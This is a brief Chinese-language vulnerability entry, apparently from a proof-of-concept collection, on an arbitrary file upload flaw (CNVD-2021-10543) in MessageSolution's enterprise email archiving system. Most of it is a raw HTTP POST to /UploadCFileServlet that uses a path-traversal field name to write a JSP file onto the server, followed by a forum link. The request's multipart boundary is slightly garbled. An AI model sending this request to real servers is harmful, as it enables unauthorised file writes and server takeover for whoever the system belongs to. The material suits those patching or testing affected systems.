# MessageSolution 企业邮件归档管理系统任意文件上传（CNVD-2021-10543）

MessageSolution企业邮件归档管理系统EEA存在任意文件上传漏洞。攻击者可利用该漏洞获取服务器权限。

poc：

```
POST /UploadCFileServlet HTTP/1.1
...

------WebKitFormBoundaryuZ7TIKJw7P14QKNg
Content-Disposition: form-data;
name="../../../../../../../../../../../../../../../../../../../../test.jsp"; filename="Report3.txt"
Content-Type: text/html

test
------WebKi tFormBoundaryuZ7TIKJw7P14QKNg
Content-Disposition: form-data; name="submit"
```

https://forum.ywhack.com/thread-115521-1-4.html